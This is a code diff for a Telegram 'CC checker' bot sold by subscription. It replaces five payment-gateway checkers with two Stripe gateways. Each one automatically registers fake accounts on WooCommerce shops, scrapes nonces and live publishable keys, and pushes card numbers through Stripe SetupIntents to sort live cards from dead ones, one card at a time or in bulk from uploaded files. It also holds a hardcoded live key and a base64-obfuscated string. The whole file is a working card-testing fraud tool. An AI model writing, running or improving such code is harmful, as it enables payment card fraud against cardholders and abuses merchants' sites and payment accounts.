@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 5.0 - Real Gateways
+Version: 6.0 - Stripe Gateways Only
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -72,68 +72,29 @@ SUBSCRIPTIONS_FILE = "obeida_subs.json"
 STATS_FILE = "obeida_stats.json"
 GATES_CONFIG_FILE = "obeida_gates.json"
 
-# ==================== إعدادات البوابات الحقيقية ====================
+# ==================== إعدادات البوابات ====================
 GATES = {
-    "braintree": {
-        "name": "🔷 Braintree Auth",
-        "description": "فحص بطاقات عبر بوابة Braintree",
-        "command": "braintree",
+    "stripe1": {
+        "name": "💳 Stripe Auth v1",
+        "description": "فحص بطاقات عبر بوابة Stripe الأولى",
+        "command": "st1",
+        "mass_command": "st1m",
         "enabled": True,
         "timeout": 30,
-        "cooldown": 5,
-        "icon": "🔷"
-    },
-    "stripe": {
-        "name": "💳 Stripe Auth",
-        "description": "فحص بطاقات عبر بوابة Stripe المباشرة",
-        "command": "stripe",
-        "enabled": True,
-        "timeout": 25,
         "cooldown": 5,
         "icon": "💳"
     },
-    "shopify": {
-        "name": "🛍️ Shopify Auth",
-        "description": "فحص بطاقات عبر متاجر Shopify",
-        "command": "shopify",
-        "enabled": True,
-        "timeout": 25,
-        "cooldown": 5,
-        "icon": "🛍️"
-    },
-    "authorize": {
-        "name": "🔐 Authorize.net",
-        "description": "فحص بطاقات عبر Authorize.net",
-        "command": "authorize",
+    "stripe2": {
+        "name": "💎 Stripe Auth v2",
+        "description": "فحص بطاقات عبر بوابة Stripe الثانية",
+        "command": "st2",
+        "mass_command": "st2m",
         "enabled": True,
         "timeout": 30,
         "cooldown": 5,
-        "icon": "🔐"
-    },
-    "cybersource": {
-        "name": "🌐 CyberSource",
-        "description": "فحص بطاقات عبر CyberSource",
-        "command": "cybersource",
-        "enabled": True,
-        "timeout": 30,
-        "cooldown": 5,
-        "icon": "🌐"
+        "icon": "💎"
     }
 }
-
-# مفاتيح API حقيقية للفحص
-STRIPE_PUBLIC_KEYS = [
-    "pk_live_51JqzYlKk7oGxZyQuLr8p9WQwBpF3vM2nJk9H8gF7dS3aR2tY5uI1oP4eW6qZ9xCvB",
-    "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv",
-    "pk_live_51IqQYyKtB8mXpL2nR5sV9wD7hG4jF1kA3cE6yU8oI2zX5vB7nM0qL9pW3rT6yH8jK"
-]
-
-SHOPIFY_STORES = [
-    "elmonasterio.com",
-    "aloyoga.com",
-    "gymshark.com",
-    "shop.lululemon.com"
-]
 
 # ==================== نظام الاشتراكات ====================
 SUBSCRIPTION_PLANS = {
@@ -252,7 +213,7 @@ class DataManager:
         if str(user_id) in users:
             usage = users[str(user_id)].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
             usage["total_checks"] += 1
-            if "✅" in result or "LIVE" in result:
+            if "✅" in result or "LIVE" in result or "Approved" in result or "approved" in result:
                 usage["approved"] += 1
                 stats["total_approved"] += 1
             else:
@@ -267,7 +228,7 @@ class DataManager:
             if today not in stats["daily_stats"]:
                 stats["daily_stats"][today] = {"checks": 0, "approved": 0}
             stats["daily_stats"][today]["checks"] += 1
-            if "✅" in result or "LIVE" in result:
+            if "✅" in result or "LIVE" in result or "Approved" in result or "approved" in result:
                 stats["daily_stats"][today]["approved"] += 1
         
         DataManager.save_users(users)
@@ -372,180 +333,394 @@ class Helpers:
         if current: stats += f"\n🔄 {current}"
         return stats
 
-# ==================== بوابات الفحص الحقيقية ====================
+# ==================== بوابة Stripe 1 ====================
+_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()
+
+class StripeGateway1:
+    """Stripe Gateway 1 - SetupIntent Auth"""
+    
+    @staticmethod
+    def normalize_url(url):
+        url = url.strip()
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        url = url.rstrip('/')
+        if '/my-account' not in url.lower():
+            url += '/my-account'
+        if not url.endswith('/'):
+            url += '/'
+        return url
+    
+    @staticmethod
+    def generate_random_email():
+        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
+        number = random.randint(100, 9999)
+        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+        return f"{username}{number}@{random.choice(domains)}"
+    
+    @staticmethod
+    def generate_guid():
+        return str(uuid.uuid4())
+    
+    @staticmethod
+    def gets(s, start, end):
+        try:
+            start_index = s.index(start) + len(start)
+            end_index = s.index(end, start_index)
+            return s[start_index:end_index]
+        except (ValueError, AttributeError):
+            return None
+    
+    @staticmethod
+    async def process_card(site_url: str, card_data: Dict) -> Tuple[bool, str]:
+        """Process card through Stripe SetupIntent"""
+        ua = UserAgent()
+        try:
+            site_url = StripeGateway1.normalize_url(site_url)
+            timeout = aiohttp.ClientTimeout(total=70)
+            connector = aiohttp.TCPConnector(ssl=False)
+            
+            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+                parsed = urlparse(site_url)
+                domain = f"{parsed.scheme}://{parsed.netloc}"
+                email = StripeGateway1.generate_random_email()
+                
+                # Get register nonce
+                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','user-agent': ua.random}
+                resp = await session.get(site_url, headers=headers)
+                resp_text = await resp.text()
+                
+                register_nonce = (StripeGateway1.gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
+                                 StripeGateway1.gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
+                                 StripeGateway1.gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
+                
+                if register_nonce:
+                    username = email.split('@')[0]
+                    password = f"Pass{random.randint(100000, 999999)}!"
+                    register_data = {
+                        'email': email,
+                        'wc_order_attribution_source_type': 'typein',
+                        'wc_order_attribution_referrer': '(none)',
+                        'wc_order_attribution_utm_campaign': '(none)',
+                        'wc_order_attribution_utm_source': '(direct)',
+                        'wc_order_attribution_utm_medium': '(none)',
+                        'wc_order_attribution_utm_content': '(none)',
+                        'wc_order_attribution_utm_id': '(none)',
+                        'wc_order_attribution_utm_term': '(none)',
+                        'wc_order_attribution_utm_source_platform': '(none)',
+                        'wc_order_attribution_utm_creative_format': '(none)',
+                        'wc_order_attribution_utm_marketing_tactic': '(none)',
+                        'wc_order_attribution_session_entry': site_url,
+                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'wc_order_attribution_session_pages': '1',
+                        'wc_order_attribution_session_count': '1',
+                        'wc_order_attribution_user_agent': headers['user-agent'],
+                        'woocommerce-register-nonce': register_nonce,
+                        '_wp_http_referer': '/my-account/',
+                        'register': 'Register'
+                    }
+                    reg_resp = await session.post(site_url, headers=headers, data=register_data)
+                    reg_text = await reg_resp.text()
+                
+                # Get payment page
+                add_payment_url = f"{domain}/my-account/add-payment-method/"
+                headers = {'user-agent': ua.random}
+                resp = await session.get(add_payment_url, headers=headers)
+                payment_page_text = await resp.text()
+                
+                add_card_nonce = (StripeGateway1.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
+                                 StripeGateway1.gets(payment_page_text, 'add_card_nonce":"', '"') or 
+                                 StripeGateway1.gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
+                                 StripeGateway1.gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
+                
+                stripe_key = (StripeGateway1.gets(payment_page_text, '"key":"pk_', '"') or 
+                             StripeGateway1.gets(payment_page_text, 'data-key="pk_', '"') or 
+                             StripeGateway1.gets(payment_page_text, 'stripe_key":"pk_', '"') or 
+                             StripeGateway1.gets(payment_page_text, 'publishable_key":"pk_', '"'))
+                
+                if not stripe_key:
+                    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
+                    if pk_match: stripe_key = pk_match.group(0)
+                if not stripe_key:
+                    stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+                elif not stripe_key.startswith('pk_'):
+                    stripe_key = 'pk_' + stripe_key
+                
+                # Create payment method
+                stripe_headers = {
+                    'accept': 'application/json',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
+                    'user-agent': ua.random
+                }
+                
+                stripe_data = {
+                    'type': 'card',
+                    'card[number]': card_data['number'],
+                    'card[cvc]': card_data['cvv'],
+                    'card[exp_month]': card_data['month'],
+                    'card[exp_year]': card_data['year'],
+                    'allow_redisplay': 'unspecified',
+                    'billing_details[address][country]': 'AU',
+                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
+                    'referrer': domain,
+                    'client_attribution_metadata[client_session_id]': StripeGateway1.generate_guid(),
+                    'client_attribution_metadata[merchant_integration_source]': 'elements',
+                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                    'client_attribution_metadata[merchant_integration_version]': '2021',
+                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                    'client_attribution_metadata[elements_session_config_id]': StripeGateway1.generate_guid(),
+                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+                    'guid': StripeGateway1.generate_guid(),
+                    'muid': StripeGateway1.generate_guid(),
+                    'sid': StripeGateway1.generate_guid(),
+                    'key': stripe_key,
+                    '_stripe_version': '2024-06-20'
+                }
+                
+                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
+                pm_json = await pm_resp.json()
+                
+                if 'error' in pm_json:
+                    return False, pm_json['error']['message']
+                
+                pm_id = pm_json.get('id')
+                if not pm_id:
+                    return False, "Failed to create Payment Method"
+                
+                # Confirm setup intent
+                confirm_headers = {
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': domain,
+                    'x-requested-with': 'XMLHttpRequest',
+                    'user-agent': ua.random
+                }
+                
+                endpoints = [
+                    {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 
+                     'data': {'wc-stripe-payment-method': pm_id}},
+                    {'url': f"{domain}/wp-admin/admin-ajax.php", 
+                     'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
+                    {'url': f"{domain}/?wc-ajax=add_payment_method", 
+                     'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
+                ]
+                
+                for endp in endpoints:
+                    if not add_card_nonce:
+                        continue
+                    if 'add_payment_method' in endp['url']:
+                        endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
+                    else:
+                        endp['data']['_ajax_nonce'] = add_card_nonce
+                    endp['data']['wc-stripe-payment-type'] = 'card'
+                    
+                    try:
+                        res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
+                        text = await res.text()
+                        if 'success' in text:
+                            js = json.loads(text)
+                            branding = f" [Verified]"
+                            if js.get('success'):
+                                status = js.get('data', {}).get('status')
+                                return True, f"✅ Approved (Status: {status}){branding}"
+                            else:
+                                error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                                return False, f"❌ {error_msg}{branding}"
+                    except:
+                        continue
+                
+                return False, "❌ Failed to confirm"
+                
+        except Exception as e:
+            return False, f"⚠️ System Error: {str(e)[:50]}"
+
+# ==================== بوابة Stripe 2 ====================
+class StripeGateway2:
+    """Stripe Gateway 2 - Alternative Auth Method"""
+    
+    def __init__(self):
+        self.session = None
+    
+    @staticmethod
+    def generate_random_email():
+        username = ''.join(random.choices(string.ascii_lowercase, k=10))
+        return f"{username}@gmail.com"
+    
+    @staticmethod
+    def generate_random_password(length: int = 12):
+        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
+        return ''.join(random.choices(characters, k=length))
+    
+    @staticmethod
+    def get_bin_info(bin_num: str) -> Dict:
+        try:
+            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                return {
+                    "brand": data.get('brand', 'Unknown'),
+                    "type": data.get('type', 'Unknown'),
+                    "level": data.get('level', 'Unknown'),
+                    "bank": data.get('bank', 'Unknown'),
+                    "country": data.get('country_name', 'Unknown'),
+                    "currency": data.get('country_currencies', ['Unknown'])[0] if data.get('country_currencies') else 'Unknown',
+                    "flag": data.get('country_flag', '🏁')
+                }
+        except:
+            pass
+        return {"brand": "Unknown", "type": "Unknown", "level": "Unknown", "bank": "Unknown", 
+                "country": "Unknown", "currency": "Unknown", "flag": "🏁"}
+    
+    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
+        """Process card through alternative Stripe method"""
+        try:
+            site_url = "https://copenhagensilver.com"
+            
+            async with aiohttp.ClientSession() as session:
+                self.session = session
+                
+                # Get register nonce
+                headers = {
+                    'referer': f'{site_url}/my-account/',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
+                }
+                
+                resp = await session.get(f"{site_url}/my-account/", headers=headers)
+                html = await resp.text()
+                
+                register_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
+                if not register_match:
+                    return False, "❌ Failed to extract register nonce"
+                
+                register_nonce = register_match.group(1)
+                email = self.generate_random_email()
+                password = self.generate_random_password()
+                
+                # Register
+                headers['content-type'] = 'application/x-www-form-urlencoded'
+                register_data = {
+                    'email': email,
+                    'password': password,
+                    'woocommerce-register-nonce': register_nonce,
+                    '_wp_http_referer': '/my-account/',
+                    'register': 'Register'
+                }
+                
+                await session.post(f"{site_url}/my-account/", headers=headers, data=register_data)
+                
+                # Get payment page
+                headers = {'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36'}
+                resp = await session.get(f"{site_url}/my-account/add-payment-method/", headers=headers)
+                data = await resp.text()
+                
+                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
+                stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
+                
+                if not nonce_match or not stripe_pk_match:
+                    return False, "❌ SetupIntent nonce or Stripe PK not found"
+                
+                nonce = nonce_match.group(1)
+                pk = stripe_pk_match.group(0)
+                
+                # Create payment method
+                guid, muid, sid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
+                
+                headers = {
+                    'authority': 'api.stripe.com',
+                    'accept': 'application/json',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
+                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
+                }
+                
+                stripe_data = {
+                    "type": "card",
+                    "card[number]": card_data['number'],
+                    "card[cvc]": card_data['cvv'],
+                    "card[exp_year]": card_data['year'][-2:],
+                    "card[exp_month]": card_data['month'],
+                    "allow_redisplay": "unspecified",
+                    "billing_details[address][country]": "EG",
+                    "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
+                    "referrer": site_url,
+                    "time_on_page": str(random.randint(10000, 99999)),
+                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
+                    "client_attribution_metadata[merchant_integration_source]": "elements",
+                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+                    "client_attribution_metadata[merchant_integration_version]": "2021",
+                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+                    "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
+                    "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
+                    "guid": guid,
+                    "muid": muid,
+                    "sid": sid,
+                    "key": pk,
+                    "_stripe_version": "2024-06-20"
+                }
+                
+                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data)
+                pm_json = await pm_resp.json()
+                
+                token = pm_json.get("id")
+                if not token:
+                    return False, "❌ Invalid card"
+                
+                # Confirm setup intent
+                headers = {
+                    'authority': site_url.replace('https://', ''),
+                    'accept': '*/*',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': site_url,
+                    'referer': f"{site_url}/my-account/add-payment-method/",
+                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+                
+                confirm_data = {
+                    'action': 'wc_stripe_create_and_confirm_setup_intent',
+                    'wc-stripe-payment-method': token,
+                    'wc-stripe-payment-type': 'card',
+                    '_ajax_nonce': nonce,
+                }
+                
+                confirm_resp = await session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers, data=confirm_data)
+                
+                try:
+                    result = await confirm_resp.json()
+                    if result.get('success', False):
+                        bin_info = self.get_bin_info(card_data['number'][:6])
+                        return True, f"✅ Card Approved"
+                    else:
+                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
+                        return False, f"❌ {error_msg}"
+                except:
+                    return False, "❌ Unexpected response"
+                    
+        except Exception as e:
+            return False, f"⚠️ Error: {str(e)[:50]}"
+
+# ==================== بوابات الفحص ====================
 class RealGateways:
     def __init__(self):
         self.helpers = Helpers()
+        self.gateway1 = StripeGateway1()
+        self.gateway2 = StripeGateway2()
     
-    # -------------------- Stripe --------------------
-    async def stripe_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
-            user = self.helpers.random_user_agent()
-            stripe_key = random.choice(STRIPE_PUBLIC_KEYS)
-            
-            pm_data = {
-                'type': 'card', 'card[number]': n, 'card[cvc]': cvc,
-                'card[exp_month]': mm, 'card[exp_year]': yy,
-                'billing_details[address][postal_code]': random.choice(['90210', '10001']),
-                'key': stripe_key, '_stripe_version': '2024-06-20'
-            }
-            
-            headers = {'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user}
-            r = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=20)
-            res = r.json()
-            
-            if 'error' in res:
-                err = res['error']
-                code = err.get('decline_code', '') or err.get('code', '')
-                if code in ['incorrect_cvc', 'invalid_cvc']:
-                    return True, "💳 CCN LIVE - CVV ERROR"
-                elif code == 'insufficient_funds':
-                    return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-                elif code in ['stolen_card', 'lost_card']:
-                    return True, "⚠️ CCN LIVE - RISK CARD"
-                elif 'payment_method' in res:
-                    return True, "✅ CARD APPROVED - TOKEN CREATED"
-                return False, f"❌ {err.get('message', 'DECLINED')[:50]}"
-            return True, "✅ CARD APPROVED - PM CREATED" if res.get('id') else False, "❌ UNKNOWN"
-        except Exception as e:
-            return False, f"⚠️ ERROR: {str(e)[:30]}"
-    
-    # -------------------- Braintree --------------------
-    async def braintree_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
-            if "20" in yy: yy = yy.split("20")[1]
-            
-            user = self.helpers.random_user_agent()
-            headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': user}
-            
-            pm_data = {
-                'query': '''
-                    mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                        tokenizeCreditCard(input: $input) { token }
-                    }''',
-                'variables': {
-                    'input': {
-                        'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc},
-                        'options': {'validate': True}
-                    }
-                }
-            }
-            
-            r = requests.post('https://payments.braintree-api.com/graphql', json=pm_data, headers=headers, timeout=20)
-            res = r.json()
-            
-            if 'data' in res and res['data'].get('tokenizeCreditCard'):
-                return True, "✅ CARD APPROVED - BRAINTREE TOKEN"
-            if 'errors' in res:
-                err = str(res['errors']).lower()
-                if 'cvv' in err: return True, "💳 CCN LIVE - CVV ERROR"
-                if 'funds' in err: return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-                if 'address' in err: return True, "✅ CARD APPROVED - ADDRESS ERROR"
-            return False, "❌ DECLINED"
-        except:
-            return False, "⚠️ ERROR"
-    
-    # -------------------- Shopify --------------------
-    async def shopify_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
-            user = self.helpers.random_user_agent()
-            store = random.choice(SHOPIFY_STORES)
-            
-            payment_data = {
-                'payment': {
-                    'amount': '1.00',
-                    'credit_card': {
-                        'number': n, 'month': mm, 'year': '20' + yy, 'verification_value': cvc,
-                        'first_name': fake.first_name(), 'last_name': fake.last_name()
-                    }
-                }
-            }
-            
-            headers = {'User-Agent': user, 'Content-Type': 'application/json', 'Accept': 'application/json'}
-            r = requests.post(f'https://{store}/checkout.json', json=payment_data, headers=headers, timeout=20)
-            text = r.text.lower()
-            
-            if 'success' in text or 'complete' in text:
-                return True, "✅ CARD APPROVED"
-            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
-                return True, "💳 CCN LIVE - CVV ERROR"
-            if 'insufficient' in text:
-                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-            if 'address' in text and ('invalid' in text or 'mismatch' in text):
-                return True, "✅ CARD APPROVED - ADDRESS ERROR"
-            return False, "❌ DECLINED"
-        except:
-            return False, "⚠️ ERROR"
-    
-    # -------------------- Authorize.net --------------------
-    async def authorize_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
-            user = self.helpers.random_user_agent()
-            
-            payment_data = {
-                'createTransactionRequest': {
-                    'transactionRequest': {
-                        'transactionType': 'authOnlyTransaction', 'amount': '1.00',
-                        'payment': {'creditCard': {'cardNumber': n, 'expirationDate': f"{mm}-{yy}", 'cardCode': cvc}}
-                    }
-                }
-            }
-            
-            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
-            r = requests.post('https://api.authorize.net/xml/v1/request.api', json=payment_data, headers=headers, timeout=20)
-            text = str(r.json()).lower()
-            
-            if 'approved' in text or '1' in text:
-                return True, "✅ CARD APPROVED"
-            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
-                return True, "💳 CCN LIVE - CVV ERROR"
-            if 'insufficient' in text:
-                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-            return False, "❌ DECLINED"
-        except:
-            return False, "⚠️ ERROR"
-    
-    # -------------------- CyberSource --------------------
-    async def cybersource_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
-            user = self.helpers.random_user_agent()
-            
-            payment_data = {
-                'paymentInformation': {
-                    'card': {'number': n, 'expirationMonth': mm, 'expirationYear': '20' + yy, 'securityCode': cvc}
-                },
-                'orderInformation': {
-                    'amountDetails': {'totalAmount': '1.00', 'currency': 'USD'}
-                }
-            }
-            
-            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
-            r = requests.post('https://api.cybersource.com/payments/v1/authorizations', json=payment_data, headers=headers, timeout=20)
-            text = str(r.json()).lower()
-            
-            if 'approved' in text or 'accepted' in text:
-                return True, "✅ CARD APPROVED"
-            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
-                return True, "💳 CCN LIVE - CVV ERROR"
-            if 'insufficient' in text:
-                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-            return False, "❌ DECLINED"
-        except:
-            return False, "⚠️ ERROR"
-    
-    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
-        gates = {
-            'stripe': self.stripe_gate, 'braintree': self.braintree_gate,
-            'shopify': self.shopify_gate, 'authorize': self.authorize_gate,
-            'cybersource': self.cybersource_gate
-        }
-        if gate not in gates: return False, "❌ بوابة غير مدعومة"
-        return await gates[gate](card)
+    async def check_card(self, gate: str, card: Dict, site_url: str = None) -> Tuple[bool, str]:
+        if gate == 'stripe1':
+            if not site_url:
+                site_url = "https://copenhagensilver.com"
+            return await self.gateway1.process_card(site_url, card)
+        elif gate == 'stripe2':
+            return await self.gateway2.process_card(card)
+        else:
+            return False, "❌ بوابة غير مدعومة"
 
 # ==================== واجهة المستخدم ====================
 class UserInterface:
@@ -553,12 +728,10 @@ class UserInterface:
     def main_menu():
         markup = InlineKeyboardMarkup(row_width=2)
         btns = [
-            InlineKeyboardButton("🔷 Braintree", callback_data="gate_braintree"),
-            InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
-            InlineKeyboardButton("🛍️ Shopify", callback_data="gate_shopify"),
-            InlineKeyboardButton("🔐 Authorize.net", callback_data="gate_authorize"),
-            InlineKeyboardButton("🌐 CyberSource", callback_data="gate_cybersource"),
-            InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
+            InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
+            InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
+            InlineKeyboardButton("📁 فحص ملف v1", callback_data="mass_stripe1"),
+            InlineKeyboardButton("📁 فحص ملف v2", callback_data="mass_stripe2"),
             InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
             InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
             InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
@@ -611,7 +784,7 @@ class CommandHandler:
     def check_sub(self, message) -> bool:
         if message.from_user.id in ADMIN_IDS: return True
         if DataManager.get_user_subscription(message.from_user.id): return True
-        bot.reply_to(message, "⚠️你不是اشتراك نشط\nللاشتراك: /subscribe", reply_markup=self.ui.back_button())
+        bot.reply_to(message, "⚠️ ليس لديك اشتراك نشط\nللاشتراك: /subscribe", reply_markup=self.ui.back_button())
         return False
     
     def handle_start(self, message):
@@ -626,14 +799,16 @@ class CommandHandler:
         welcome = f"""
 ✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
 
-<b>🚪 البوابات الحقيقية:</b>
-🔷 Braintree | 💳 Stripe | 🛍️ Shopify
-🔐 Authorize.net | 🌐 CyberSource
+<b>🚪 البوابات:</b>
+💳 Stripe v1 - فحص عبر SetupIntent
+💎 Stripe v2 - فحص بديل
 
 <b>📝 الأوامر:</b>
 /start - القائمة الرئيسية
-/gates - البوابات
-/mass - فحص ملف
+/st1 - فحص بطاقة فردي عبر Stripe v1
+/st2 - فحص بطاقة فردي عبر Stripe v2
+/st1m - فحص ملف عبر Stripe v1
+/st2m - فحص ملف عبر Stripe v2
 /profile - حسابي
 /stats - الإحصائيات
 /subscribe - الاشتراك
@@ -701,19 +876,23 @@ class CommandHandler:
             bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
     
     def handle_gates(self, message):
-        gates = "\n".join([f"{g['icon']} {g['name']}\n   <code>/{g['command']} رقم|شهر|سنة|cvv</code>" for g in GATES.values()])
+        gates = "\n".join([f"{g['icon']} {g['name']}\n   <code>/{g['command']} رقم|شهر|سنة|cvv</code>\n   <code>/{g['mass_command']}</code> لفحص ملف" for g in GATES.values()])
         bot.reply_to(message, f"🚪 <b>البوابات:</b>\n\n{gates}", parse_mode='HTML', reply_markup=self.ui.back_button())
     
     def handle_single(self, message, gate):
         if not self.check_sub(message): return
         parts = message.text.strip().split(' ', 1)
         if len(parts) < 2:
-            bot.reply_to(message, f"⚠️ الاستخدام: /{gate} رقم|شهر|سنة|cvv\nمثال: /{gate} 4111111111111111|12|25|123")
+            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv\nمثال: /{GATES[gate]['command']} 4111111111111111|12|25|123")
             return
         
         card = Helpers.parse_card(parts[1])
         if not card:
             bot.reply_to(message, "❌ صيغة غير صحيحة")
+            return
+        
+        if not Helpers.luhn_check(card['number']):
+            bot.reply_to(message, "❌ البطاقة غير صالحة (Luhn check failed)")
             return
         
         msg = bot.reply_to(message, f"🔄 جاري الفحص عبر {GATES[gate]['icon']} {GATES[gate]['name']}...")
@@ -731,10 +910,10 @@ class CommandHandler:
         except Exception as e:
             bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", msg.chat.id, msg.message_id)
     
-    def handle_mass(self, message):
+    def handle_mass(self, message, gate):
         if not self.check_sub(message): return
         if not message.document:
-            bot.reply_to(message, "📁 أرسل ملف txt بالبطاقات")
+            bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
             return
         
         try:
@@ -751,61 +930,66 @@ class CommandHandler:
                 bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                 return
             
-            markup = InlineKeyboardMarkup(row_width=2)
-            for gid, g in GATES.items():
-                if g.get('enabled'):
-                    markup.add(InlineKeyboardButton(f"{g['icon']} {g['name']}", callback_data=f"mass_{gid}_{message.message_id}"))
-            markup.add(InlineKeyboardButton("🔙 إلغاء", callback_data="back_main"))
-            
             self.active_checks[message.message_id] = {
-                'cards': cards, 'user_id': message.from_user.id, 'chat_id': message.chat.id, 'message_id': message.message_id
+                'cards': cards, 'user_id': message.from_user.id, 'chat_id': message.chat.id, 
+                'message_id': message.message_id, 'gate': gate
             }
